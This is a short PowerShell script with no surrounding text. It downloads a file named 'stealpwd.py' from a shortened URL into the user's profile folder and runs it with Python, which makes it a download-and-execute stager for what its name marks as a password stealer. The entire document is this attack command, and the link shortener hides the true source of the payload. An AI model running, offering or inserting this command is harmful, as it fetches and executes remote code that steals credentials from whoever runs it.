$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://rebrand.ly/iab05iw", "$env:USERPROFILE\stealpwd.py")
python3 "$env:USERPROFILE\stealpwd.py"
